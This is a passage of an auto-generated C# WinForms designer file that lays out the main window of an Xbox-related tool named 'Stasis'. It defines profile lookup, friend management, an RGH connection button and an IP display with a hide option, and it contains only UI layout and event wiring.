            this.XboxProfilePic.TabIndex = 69;
            this.XboxProfilePic.TabStop = false;
            // 
            // ProfileLocation
            // 
            this.ProfileLocation.BackColor = System.Drawing.Color.Black;
            this.ProfileLocation.CustomBackground = true;
            this.ProfileLocation.CustomForeColor = true;
            this.ProfileLocation.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.ProfileLocation.Location = new System.Drawing.Point(332, 31);
            this.ProfileLocation.MaxLength = 15;
            this.ProfileLocation.Name = "ProfileLocation";
            this.ProfileLocation.PromptText = "Location";
            this.ProfileLocation.Size = new System.Drawing.Size(220, 23);
            this.ProfileLocation.Style = MetroFramework.MetroColorStyle.Black;
            this.ProfileLocation.TabIndex = 64;
            this.ProfileLocation.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.ProfileLocation.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // SetBioBtn
            // 
            this.SetBioBtn.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(37)))), ((int)(((byte)(37)))), ((int)(((byte)(37)))));
            this.SetBioBtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.SetBioBtn.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.SetBioBtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.SetBioBtn.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.SetBioBtn.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.SetBioBtn.Location = new System.Drawing.Point(372, 59);
            this.SetBioBtn.Name = "SetBioBtn";
            this.SetBioBtn.Size = new System.Drawing.Size(36, 25);
            this.SetBioBtn.TabIndex = 68;
            this.SetBioBtn.Text = "Set";
            this.SetBioBtn.UseVisualStyleBackColor = true;
            this.SetBioBtn.Click += new System.EventHandler(this.SetBioBtn_Click);
            // 
            // AddFriendBtn
            // 
            this.AddFriendBtn.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(37)))), ((int)(((byte)(37)))), ((int)(((byte)(37)))));
            this.AddFriendBtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.AddFriendBtn.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.AddFriendBtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.AddFriendBtn.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.AddFriendBtn.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.AddFriendBtn.Location = new System.Drawing.Point(16, 13);
            this.AddFriendBtn.Name = "AddFriendBtn";
            this.AddFriendBtn.Size = new System.Drawing.Size(126, 25);
            this.AddFriendBtn.TabIndex = 50;
            this.AddFriendBtn.Text = "Add Friend";
            this.AddFriendBtn.UseVisualStyleBackColor = true;
            this.AddFriendBtn.Click += new System.EventHandler(this.AddFriendBtn_Click);
            // 
            // SetLocationBtn
            // 
            this.SetLocationBtn.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(37)))), ((int)(((byte)(37)))), ((int)(((byte)(37)))));
            this.SetLocationBtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.SetLocationBtn.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.SetLocationBtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.SetLocationBtn.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.SetLocationBtn.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.SetLocationBtn.Location = new System.Drawing.Point(558, 29);
            this.SetLocationBtn.Name = "SetLocationBtn";
            this.SetLocationBtn.Size = new System.Drawing.Size(36, 25);
            this.SetLocationBtn.TabIndex = 67;
            this.SetLocationBtn.Text = "Set";
            this.SetLocationBtn.UseVisualStyleBackColor = true;
            // 
            // DeleteFriendBtn
            // 
            this.DeleteFriendBtn.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(37)))), ((int)(((byte)(37)))), ((int)(((byte)(37)))));
            this.DeleteFriendBtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.DeleteFriendBtn.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.DeleteFriendBtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.DeleteFriendBtn.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.DeleteFriendBtn.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.DeleteFriendBtn.Location = new System.Drawing.Point(16, 42);
            this.DeleteFriendBtn.Name = "DeleteFriendBtn";
            this.DeleteFriendBtn.Size = new System.Drawing.Size(126, 25);
            this.DeleteFriendBtn.TabIndex = 55;
            this.DeleteFriendBtn.Text = "Delete Friend";
            this.DeleteFriendBtn.UseVisualStyleBackColor = true;
            this.DeleteFriendBtn.Click += new System.EventHandler(this.button28_Click);
            // 
            // label11
            // 
            this.label11.AutoSize = true;
            this.label11.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            this.label11.Font = new System.Drawing.Font("Palatino Linotype", 9F, System.Drawing.FontStyle.Bold);
            this.label11.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.label11.Location = new System.Drawing.Point(332, 66);
            this.label11.Name = "label11";
            this.label11.Size = new System.Drawing.Size(29, 17);
            this.label11.TabIndex = 66;
            this.label11.Text = "Bio:";
            // 
            // label10
            // 
            this.label10.AutoSize = true;
            this.label10.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            this.label10.Font = new System.Drawing.Font("Palatino Linotype", 9F, System.Drawing.FontStyle.Bold);
            this.label10.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.label10.Location = new System.Drawing.Point(332, 9);
            this.label10.Name = "label10";
            this.label10.Size = new System.Drawing.Size(58, 17);
            this.label10.TabIndex = 65;
            this.label10.Text = "Location:";
            // 
            // metroPanel70
            // 
            this.metroPanel70.Controls.Add(this.GamerScore);
            this.metroPanel70.Controls.Add(this.XboxOneRep);
            this.metroPanel70.Controls.Add(this.ProfileGamertag);
            this.metroPanel70.Controls.Add(this.PresenceText);
            this.metroPanel70.Controls.Add(this.RealName);
            this.metroPanel70.Controls.Add(this.PresenceState);
            this.metroPanel70.Controls.Add(this.DisplayName);
            this.metroPanel70.HorizontalScrollbarBarColor = true;
            this.metroPanel70.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel70.HorizontalScrollbarSize = 10;
            this.metroPanel70.Location = new System.Drawing.Point(16, 73);
            this.metroPanel70.Name = "metroPanel70";
            this.metroPanel70.Size = new System.Drawing.Size(310, 218);
            this.metroPanel70.TabIndex = 63;
            this.metroPanel70.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel70.VerticalScrollbarBarColor = true;
            this.metroPanel70.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel70.VerticalScrollbarSize = 10;
            // 
            // GamerScore
            // 
            this.GamerScore.AutoSize = true;
            this.GamerScore.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            this.GamerScore.Font = new System.Drawing.Font("Palatino Linotype", 9F, System.Drawing.FontStyle.Bold);
            this.GamerScore.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.GamerScore.Location = new System.Drawing.Point(15, 162);
            this.GamerScore.Name = "GamerScore";
            this.GamerScore.Size = new System.Drawing.Size(79, 17);
            this.GamerScore.TabIndex = 61;
            this.GamerScore.Text = "GamerScore:";
            // 
            // XboxOneRep
            // 
            this.XboxOneRep.AutoSize = true;
            this.XboxOneRep.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            this.XboxOneRep.Font = new System.Drawing.Font("Palatino Linotype", 9F, System.Drawing.FontStyle.Bold);
            this.XboxOneRep.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.XboxOneRep.Location = new System.Drawing.Point(14, 133);
            this.XboxOneRep.Name = "XboxOneRep";
            this.XboxOneRep.Size = new System.Drawing.Size(89, 17);
            this.XboxOneRep.TabIndex = 60;
            this.XboxOneRep.Text = "Xbox One Rep:";
            // 
            // ProfileGamertag
            // 
            this.ProfileGamertag.AutoSize = true;
            this.ProfileGamertag.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            this.ProfileGamertag.Font = new System.Drawing.Font("Palatino Linotype", 9F, System.Drawing.FontStyle.Bold);
            this.ProfileGamertag.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.ProfileGamertag.Location = new System.Drawing.Point(15, 10);
            this.ProfileGamertag.Name = "ProfileGamertag";
            this.ProfileGamertag.Size = new System.Drawing.Size(66, 17);
            this.ProfileGamertag.TabIndex = 54;
            this.ProfileGamertag.Text = "Gamertag:";
            // 
            // PresenceText
            // 
            this.PresenceText.AutoSize = true;
            this.PresenceText.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            this.PresenceText.Font = new System.Drawing.Font("Palatino Linotype", 9F, System.Drawing.FontStyle.Bold);
            this.PresenceText.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.PresenceText.Location = new System.Drawing.Point(15, 107);
            this.PresenceText.Name = "PresenceText";
            this.PresenceText.Size = new System.Drawing.Size(85, 17);
            this.PresenceText.TabIndex = 59;
            this.PresenceText.Text = "Presence Text:";
            // 
            // RealName
            // 
            this.RealName.AutoSize = true;
            this.RealName.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            this.RealName.Font = new System.Drawing.Font("Palatino Linotype", 9F, System.Drawing.FontStyle.Bold);
            this.RealName.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.RealName.Location = new System.Drawing.Point(15, 56);
            this.RealName.Name = "RealName";
            this.RealName.Size = new System.Drawing.Size(71, 17);
            this.RealName.TabIndex = 55;
            this.RealName.Text = "Real Name:";
            // 
            // PresenceState
            // 
            this.PresenceState.AutoSize = true;
            this.PresenceState.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            this.PresenceState.Font = new System.Drawing.Font("Palatino Linotype", 9F, System.Drawing.FontStyle.Bold);
            this.PresenceState.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.PresenceState.Location = new System.Drawing.Point(15, 78);
            this.PresenceState.Name = "PresenceState";
            this.PresenceState.Size = new System.Drawing.Size(89, 17);
            this.PresenceState.TabIndex = 58;
            this.PresenceState.Text = "Presence State:";
            // 
            // DisplayName
            // 
            this.DisplayName.AutoSize = true;
            this.DisplayName.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            this.DisplayName.Font = new System.Drawing.Font("Palatino Linotype", 9F, System.Drawing.FontStyle.Bold);
            this.DisplayName.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.DisplayName.Location = new System.Drawing.Point(15, 33);
            this.DisplayName.Name = "DisplayName";
            this.DisplayName.Size = new System.Drawing.Size(88, 17);
            this.DisplayName.TabIndex = 57;
            this.DisplayName.Text = "Display Name:";
            // 
            // BIO
            // 
            this.BIO.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            this.BIO.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.BIO.Location = new System.Drawing.Point(332, 86);
            this.BIO.Name = "BIO";
            this.BIO.Size = new System.Drawing.Size(262, 132);
            this.BIO.TabIndex = 62;
            this.BIO.Text = "";
            // 
            // GamertagProfileLookupName
            // 
            this.GamertagProfileLookupName.BackColor = System.Drawing.Color.Black;
            this.GamertagProfileLookupName.CustomBackground = true;
            this.GamertagProfileLookupName.CustomForeColor = true;
            this.GamertagProfileLookupName.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.GamertagProfileLookupName.Location = new System.Drawing.Point(259, 3);
            this.GamertagProfileLookupName.MaxLength = 15;
            this.GamertagProfileLookupName.Name = "GamertagProfileLookupName";
            this.GamertagProfileLookupName.PromptText = "Enter Gamertag";
            this.GamertagProfileLookupName.Size = new System.Drawing.Size(144, 23);
            this.GamertagProfileLookupName.Style = MetroFramework.MetroColorStyle.Black;
            this.GamertagProfileLookupName.TabIndex = 53;
            this.GamertagProfileLookupName.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.GamertagProfileLookupName.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.GamertagProfileLookupName.UseStyleColors = true;
            // 
            // LookupProfileBtn
            // 
            this.LookupProfileBtn.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(37)))), ((int)(((byte)(37)))), ((int)(((byte)(37)))));
            this.LookupProfileBtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.LookupProfileBtn.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.LookupProfileBtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.LookupProfileBtn.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.LookupProfileBtn.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.LookupProfileBtn.Location = new System.Drawing.Point(131, 3);
            this.LookupProfileBtn.Name = "LookupProfileBtn";
            this.LookupProfileBtn.Size = new System.Drawing.Size(122, 25);
            this.LookupProfileBtn.TabIndex = 52;
            this.LookupProfileBtn.Text = "Lookup Gamertag";
            this.LookupProfileBtn.UseVisualStyleBackColor = true;
            this.LookupProfileBtn.Click += new System.EventHandler(this.LookupProfileBtn_Click);
            // 
            // ViewMyProfileBtn
            // 
            this.ViewMyProfileBtn.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(37)))), ((int)(((byte)(37)))), ((int)(((byte)(37)))));
            this.ViewMyProfileBtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.ViewMyProfileBtn.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.ViewMyProfileBtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.ViewMyProfileBtn.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.ViewMyProfileBtn.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.ViewMyProfileBtn.Location = new System.Drawing.Point(3, 3);
            this.ViewMyProfileBtn.Name = "ViewMyProfileBtn";
            this.ViewMyProfileBtn.Size = new System.Drawing.Size(122, 25);
            this.ViewMyProfileBtn.TabIndex = 51;
            this.ViewMyProfileBtn.Text = "My Profile";
            this.ViewMyProfileBtn.UseVisualStyleBackColor = false;
            this.ViewMyProfileBtn.Click += new System.EventHandler(this.ViewMyProfileBtn_Click);
            // 
            // metroTabPage8
            // 
            this.metroTabPage8.Controls.Add(this.metroTabControl2);
            this.metroTabPage8.Controls.Add(this.ConnectJtagBtn);
            this.metroTabPage8.Enabled = true;
            this.metroTabPage8.HorizontalScrollbarBarColor = true;
            this.metroTabPage8.Location = new System.Drawing.Point(4, 38);
            this.metroTabPage8.Name = "metroTabPage8";
            this.metroTabPage8.Size = new System.Drawing.Size(969, 372);
            this.metroTabPage8.TabIndex = 7;
            this.metroTabPage8.Text = "RGH";
            this.metroTabPage8.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroTabPage8.VerticalScrollbarBarColor = true;
            this.metroTabPage8.Visible = false;
            // 
            // metroTabControl2
            // 
            this.metroTabControl2.Appearance = System.Windows.Forms.TabAppearance.FlatButtons;
            this.metroTabControl2.Controls.Add(this.metroTabPage9);
            this.metroTabControl2.Location = new System.Drawing.Point(4, 35);
            this.metroTabControl2.Name = "metroTabControl2";
            this.metroTabControl2.Padding = new System.Drawing.Point(6, 8);
            this.metroTabControl2.SelectedIndex = 0;
            this.metroTabControl2.Size = new System.Drawing.Size(946, 334);
            this.metroTabControl2.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroTabControl2.TabIndex = 53;
            this.metroTabControl2.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroTabControl2.UseStyleColors = true;
            // 
            // metroTabPage9
            // 
            this.metroTabPage9.BackColor = System.Drawing.Color.Black;
            this.metroTabPage9.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("metroTabPage9.BackgroundImage")));
            this.metroTabPage9.Enabled = true;
            this.metroTabPage9.HorizontalScrollbarBarColor = true;
            this.metroTabPage9.Location = new System.Drawing.Point(4, 38);
            this.metroTabPage9.Name = "metroTabPage9";
            this.metroTabPage9.Size = new System.Drawing.Size(938, 292);
            this.metroTabPage9.Style = MetroFramework.MetroColorStyle.Black;
            this.metroTabPage9.TabIndex = 0;
            this.metroTabPage9.Text = "metroTabPage9";
            this.metroTabPage9.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroTabPage9.UseVisualStyleBackColor = true;
            this.metroTabPage9.VerticalScrollbarBarColor = true;
            this.metroTabPage9.Visible = false;
            // 
            // ConnectJtagBtn
            // 
            this.ConnectJtagBtn.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(37)))), ((int)(((byte)(37)))), ((int)(((byte)(37)))));
            this.ConnectJtagBtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.ConnectJtagBtn.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.ConnectJtagBtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.ConnectJtagBtn.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.ConnectJtagBtn.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.ConnectJtagBtn.Location = new System.Drawing.Point(3, 3);
            this.ConnectJtagBtn.Name = "ConnectJtagBtn";
            this.ConnectJtagBtn.Size = new System.Drawing.Size(122, 25);
            this.ConnectJtagBtn.TabIndex = 52;
            this.ConnectJtagBtn.Text = "Connect RGH";
            this.ConnectJtagBtn.UseVisualStyleBackColor = false;
            this.ConnectJtagBtn.Click += new System.EventHandler(this.ConnectJtagBtn_Click);
            // 
            // button9
            // 
            this.button9.Location = new System.Drawing.Point(0, 0);
            this.button9.Name = "button9";
            this.button9.Size = new System.Drawing.Size(75, 23);
            this.button9.TabIndex = 0;
            // 
            // pictureBox1
            // 
            this.pictureBox1.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox1.Image")));
            this.pictureBox1.Location = new System.Drawing.Point(374, 11);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(260, 47);
            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox1.TabIndex = 20;
            this.pictureBox1.TabStop = false;
            this.pictureBox1.Visible = false;
            // 
            // pictureBox2
            // 
            this.pictureBox2.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.pictureBox2.BackColor = System.Drawing.Color.Transparent;
            this.pictureBox2.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox2.Image")));
            this.pictureBox2.Location = new System.Drawing.Point(-183, 0);
            this.pictureBox2.Name = "pictureBox2";
            this.pictureBox2.Size = new System.Drawing.Size(1456, 7);
            this.pictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox2.TabIndex = 17;
            this.pictureBox2.TabStop = false;
            // 
            // button6
            // 
            this.button6.Anchor = System.Windows.Forms.AnchorStyles.None;
            this.button6.FlatAppearance.BorderColor = System.Drawing.Color.Teal;
            this.button6.FlatAppearance.MouseDownBackColor = System.Drawing.Color.Transparent;
            this.button6.FlatAppearance.MouseOverBackColor = System.Drawing.Color.Transparent;
            this.button6.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button6.ForeColor = System.Drawing.Color.Teal;
            this.button6.Location = new System.Drawing.Point(977, 13);
            this.button6.Name = "button6";
            this.button6.Size = new System.Drawing.Size(25, 23);
            this.button6.TabIndex = 21;
            this.button6.Text = "X";
            this.button6.UseVisualStyleBackColor = true;
            this.button6.Click += new System.EventHandler(this.button6_Click);
            // 
            // button7
            // 
            this.button7.Anchor = System.Windows.Forms.AnchorStyles.None;
            this.button7.FlatAppearance.BorderColor = System.Drawing.Color.Teal;
            this.button7.FlatAppearance.MouseDownBackColor = System.Drawing.Color.Transparent;
            this.button7.FlatAppearance.MouseOverBackColor = System.Drawing.Color.Transparent;
            this.button7.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button7.ForeColor = System.Drawing.Color.Teal;
            this.button7.Location = new System.Drawing.Point(946, 13);
            this.button7.Name = "button7";
            this.button7.Size = new System.Drawing.Size(25, 23);
            this.button7.TabIndex = 23;
            this.button7.Text = "_";
            this.button7.UseVisualStyleBackColor = true;
            this.button7.Click += new System.EventHandler(this.button7_Click);
            // 
            // metroLabel2
            // 
            this.metroLabel2.Anchor = System.Windows.Forms.AnchorStyles.None;
            this.metroLabel2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            this.metroLabel2.CustomBackground = true;
            this.metroLabel2.CustomForeColor = true;
            this.metroLabel2.FontSize = MetroFramework.MetroLabelSize.Tall;
            this.metroLabel2.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.metroLabel2.Location = new System.Drawing.Point(429, 60);
            this.metroLabel2.Name = "metroLabel2";
            this.metroLabel2.Size = new System.Drawing.Size(159, 28);
            this.metroLabel2.TabIndex = 24;
            this.metroLabel2.Text = "Welcome To Stasis!";
            this.metroLabel2.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // button14
            // 
            this.button14.BackColor = System.Drawing.Color.Transparent;
            this.button14.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("button14.BackgroundImage")));
            this.button14.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.button14.Cursor = System.Windows.Forms.Cursors.Default;
            this.button14.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.button14.FlatAppearance.BorderSize = 0;
            this.button14.FlatAppearance.MouseDownBackColor = System.Drawing.Color.Transparent;
            this.button14.FlatAppearance.MouseOverBackColor = System.Drawing.Color.Transparent;
            this.button14.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button14.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button14.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.button14.Location = new System.Drawing.Point(897, 11);
            this.button14.Name = "button14";
            this.button14.Size = new System.Drawing.Size(43, 23);
            this.button14.TabIndex = 25;
            this.button14.UseVisualStyleBackColor = false;
            this.button14.Click += new System.EventHandler(this.button14_Click);
            // 
            // label7
            // 
            this.label7.Anchor = System.Windows.Forms.AnchorStyles.None;
            this.label7.BackColor = System.Drawing.Color.Transparent;
            this.label7.Font = new System.Drawing.Font("Palatino Linotype", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label7.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.label7.Location = new System.Drawing.Point(936, 526);
            this.label7.Name = "label7";
            this.label7.Size = new System.Drawing.Size(68, 21);
            this.label7.TabIndex = 26;
            this.label7.Text = "Time";
            this.label7.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // timer1
            // 
            this.timer1.Enabled = true;
            this.timer1.Interval = 1000;
            this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
            // 
            // label5
            // 
            this.label5.AutoSize = true;
            this.label5.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            this.label5.Font = new System.Drawing.Font("Palatino Linotype", 9F, System.Drawing.FontStyle.Bold);
            this.label5.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.label5.Location = new System.Drawing.Point(5, 528);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(60, 17);
            this.label5.TabIndex = 28;
            this.label5.Text = "Public IP:";
            // 
            // metroCheckBox1
            // 
            this.metroCheckBox1.AutoSize = true;
            this.metroCheckBox1.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.metroCheckBox1.ForeColor = System.Drawing.Color.Aqua;
            this.metroCheckBox1.Location = new System.Drawing.Point(6, 13);
            this.metroCheckBox1.Name = "metroCheckBox1";
            this.metroCheckBox1.Size = new System.Drawing.Size(61, 15);
            this.metroCheckBox1.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroCheckBox1.TabIndex = 29;
            this.metroCheckBox1.Text = "Hide IP";
            this.metroCheckBox1.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroCheckBox1.UseStyleColors = true;
            this.metroCheckBox1.UseVisualStyleBackColor = true;
            this.metroCheckBox1.CheckedChanged += new System.EventHandler(this.metroCheckBox1_CheckedChanged);
            // 
            // FormMain
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(1009, 555);
            this.ControlBox = false;
            this.Controls.Add(this.metroCheckBox1);
            this.Controls.Add(this.label5);
            this.Controls.Add(this.button14);
            this.Controls.Add(this.label7);
            this.Controls.Add(this.metroLabel2);
            this.Controls.Add(this.button7);
            this.Controls.Add(this.button6);
            this.Controls.Add(this.pictureBox2);
            this.Controls.Add(this.LabelAuthor);
            this.Controls.Add(this.pictureBox1);
            this.Controls.Add(this.metroTabControl1);
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.MaximizeBox = false;
            this.Name = "FormMain";
            this.Resizable = false;
            this.Style = MetroFramework.MetroColorStyle.Teal;
            this.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.Load += new System.EventHandler(this.FormMain_Load);
            this.contextMenuStrip2.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.DataFriends)).EndInit();
            this.contextMenuStrip3.ResumeLayout(false);
            this.contextMenuStrip3.PerformLayout();
            this.metroTabControl1.ResumeLayout(false);
            this.metroTabPage6.ResumeLayout(false);
            this.metroTabPage6.PerformLayout();
            this.metroTabPage1.ResumeLayout(false);
            this.metroTabPage1.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.DataClients)).EndInit();
            this.metroTabPage2.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.numericUpDown2)).EndInit();
            this.metroTabPage4.ResumeLayout(false);
            this.metroTabPage4.PerformLayout();
            this.metroTabPage3.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.ClientHistory)).EndInit();
            this.contextMenuStrip1.ResumeLayout(false);
            this.metroTabPage5.ResumeLayout(false);
            this.metroTabPage7.ResumeLayout(false);
            this.metroPanel69.ResumeLayout(false);
            this.metroPanel69.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.Avi)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.XboxProfilePic)).EndInit();
            this.metroPanel70.ResumeLayout(false);
            this.metroPanel70.PerformLayout();
            this.metroTabPage8.ResumeLayout(false);
            this.metroTabControl2.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();

    }
  }
}
